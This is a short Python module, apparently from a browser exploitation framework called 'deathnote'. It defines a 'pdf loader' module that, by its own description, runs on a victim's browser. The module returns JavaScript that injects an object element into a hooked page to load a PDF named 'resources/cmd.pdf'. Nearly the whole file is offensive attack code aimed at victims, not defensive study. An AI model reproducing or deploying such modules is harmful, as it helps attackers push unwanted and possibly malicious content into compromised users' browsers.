from deathnote_module import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "pdf loader",
		"description": "Loads a PDF and runs it on victims browser",
		"target": (
			"all",
		),
	}	
	

	def run(self):
		js = """
			elt = document.createElement('div');
			elt.innerHTML = "<object width='500' height='650' data='resources/cmd.pdf' type='application/pdf' ></object>";
			document.body.appendChild(elt);
		"""
		return js
